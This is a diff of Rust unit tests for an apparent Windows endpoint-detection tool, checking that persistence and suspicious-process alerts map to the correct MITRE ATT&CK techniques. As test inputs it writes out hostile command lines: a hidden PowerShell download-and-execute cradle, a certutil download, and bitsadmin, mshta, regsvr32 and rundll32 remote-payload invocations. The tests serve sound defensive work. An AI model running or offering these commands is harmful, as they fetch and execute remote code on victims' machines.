@@ -4083,10 +4083,10 @@ fn phase3_bornage_garde_la_conclusion() {
     use crate::commun::{borner_alerte, Alerte};
     let commande = format!("powershell.exe{}-w hidden -c iex (New-Object Net.WebClient).DownloadString('http://203.0.113.5/a')", " ".repeat(1100));
     let remarque = crate::processus::suspicion(&commande).expect("motif PowerShell");
-    let mut a = Alerte { regle: "PER-001".into(), niveau: "Alerte".into(), score: 3, raisons: format!("NOUVEAU démarrage automatique : {commande} [{remarque}]"), ..Default::default() };
+    let mut a = Alerte { regle: "PER-001".into(), mitre: "T1547.001".into(), niveau: "Alerte".into(), score: 3, raisons: format!("NOUVEAU démarrage automatique : {commande} [{remarque}]"), ..Default::default() };
     crate::mitre::enrichir(&mut a);
     assert!(crate::apprentissage::signal_fort(&a), "témoin : signal fort sur le texte entier");
-    // Couverture ATT&CK, lot 2 : la technique vient de la règle (PER-001), plus des mots du texte
+    // La technique est celle posée par le producteur (type d'entrée : clé Run), plus des mots du texte (point 1 de la revue du 2026-11-22)
     let mitre = a.mitre.clone();
     assert!(mitre.contains("T1547.001"), "témoin : technique de la persistance ({mitre})");
     borner_alerte(&mut a);
@@ -8523,9 +8523,10 @@ fn attack_lot2_table_des_techniques_complete() {
         }
     }
     par_l_alerte.sort();
-    assert_eq!(par_l_alerte, ["CHA-001", "COR-R7", "EXP-DPI-001", "EXP-IDS-001", "EXP-NDR-001", "VIE-001", "VIE-002"]);
+    assert_eq!(par_l_alerte, ["CHA-001", "COR-R7", "EXP-DPI-001", "EXP-IDS-001", "EXP-NDR-001", "PER-001", "PER-002", "PRC-003", "VIE-001", "VIE-002"]);
     // Toute technique posée par le code (identifiants littéraux) a un nom
     for (nom, source) in [("dpi", include_str!("dpi.rs")), ("ndr", include_str!("ndr.rs")), ("siem", include_str!("siem.rs")),
+                          ("processus", include_str!("processus.rs")), ("persistance", include_str!("persistance.rs")),
                           ("parefeu", include_str!("parefeu.rs")), ("surveillances", include_str!("surveillances.rs"))] {
         for id in regex::Regex::new(r#""(T1[0-9]{3}(?:\.[0-9]{3})?)""#).unwrap().captures_iter(source) {
             assert_ne!(crate::mitre::libelle(&id[1]), &id[1], "{nom} : technique {} sans nom", &id[1]);
@@ -9624,4 +9625,62 @@ fn audit_p2_def007_regles_asr_distinctes() {
     assert_eq!(a.regle, "DEF-007");
     assert_eq!(a.comportement, "asr:d4f940ab-401b-4efc-aadc-ad5f3c50688a");
     assert_ne!(signature_avec(&a, "e"), signature_avec(&b, "e"));
+}
+
+// ------------------------------------------------- revue de l'auditeur du 2026-11-22, point 1 : techniques observées
+
+fn info_processus_test(image: &str, ligne: &str) -> crate::processus::InfoProcessus {
+    crate::processus::InfoProcessus::pour_test(image, Some(ligne), None)
+}
+
+/// PRC-003 sur certutil : la technique de certutil (T1105), jamais T1047 ni les autres outils de la règle
+#[test]
+fn audit_p1_prc003_certutil_sans_t1047() {
+    let p = info_processus_test(r"C:\Windows\System32\certutil.exe", "certutil.exe -urlcache -split -f http://203.0.113.5/a.exe a.exe");
+    let mut a = crate::processus::alerte_processus(1234, &p).expect("PRC-003");
+    assert_eq!(a.regle, "PRC-003");
+    crate::mitre::enrichir(&mut a);
+    assert_eq!(crate::mitre::identifiants(&a), ["T1105"], "certutil : T1105 seulement ({})", a.mitre);
+    assert!(!a.mitre.contains("T1047") && !a.mitre.contains("T1197") && !a.mitre.contains("T1218"));
+    // L'outil vient du motif qui a correspondu, pas d'un nom vu ailleurs dans la ligne
+    let w = info_processus_test(r"C:\Windows\System32\wbem\wmic.exe", r"wmic process call create C:\certutil\x.exe");
+    let mut b = crate::processus::alerte_processus(1, &w).expect("PRC-003 wmic");
+    crate::mitre::enrichir(&mut b);
+    assert_eq!(crate::mitre::identifiants(&b), ["T1047"]);
+    for (ligne, t) in [("bitsadmin /transfer j http://x/y c:\\y", "T1197"), ("mshta http://x/y.hta", "T1218"),
+                       ("regsvr32 /s /n /u /i:http://x/y.sct scrobj.dll", "T1218"), ("rundll32 javascript:\"\\..\\mshtml\"", "T1218")] {
+        assert_eq!(crate::processus::technique_prc003(ligne), t, "{ligne}");
+    }
+}
+
+/// PER-001 sur une clé Run : T1547.001, jamais T1546.003 ni les autres types de la règle
+#[test]
+fn audit_p1_per001_cle_run_sans_t1546() {
+    let e = crate::commun::EntreeDemarrage {
+        cle: "Run (machine)|x".into(), categorie: "Run (machine)".into(), nom: "x".into(),
+        commande: r"C:\Users\Public\x.exe".into(), cible: r"C:\Users\Public\x.exe".into(), ..Default::default()
+    };
+    let mut a = crate::persistance::alerter(&e, "NOUVEAU");
+    assert_eq!(a.regle, "PER-001");
+    crate::mitre::enrichir(&mut a);
+    assert_eq!(crate::mitre::identifiants(&a), ["T1547.001"], "clé Run ({})", a.mitre);
+    assert!(!a.mitre.contains("T1546") && !a.mitre.contains("T1543") && !a.mitre.contains("T1053"));
+    // PER-002 sur la même clé : T1547.001 seulement (plus T1112)
+    let mut m = crate::persistance::alerter(&e, "MODIFIÉ");
+    assert_eq!(m.regle, "PER-002");
+    crate::mitre::enrichir(&mut m);
+    assert_eq!(crate::mitre::identifiants(&m), ["T1547.001"]);
+    use crate::persistance::technique_entree;
+    for (t, id) in [("tache", "T1053.005"), ("service", "T1543.003"), ("pilote", "T1543.003"), ("wmi", "T1546.003"),
+                    ("dossier-demarrage", "T1547.001"), ("winlogon", ""), ("ifeo", ""), ("appinit", ""), ("autre", "")] {
+        assert_eq!(technique_entree(t), id, "{t}");
+    }
+}
+
+/// RES-002, RES-003 et DNS-001 : la technique observée seulement
+#[test]
+fn audit_p1_reseau_technique_observee() {
+    for (regle, attendu) in [("RES-002", "T1071.001"), ("RES-003", "T1071.001"), ("DNS-001", "T1071.004")] {
+        assert_eq!(crate::mitre::identifiants_de_regle(regle, ""), [attendu], "{regle}");
+    }
 }
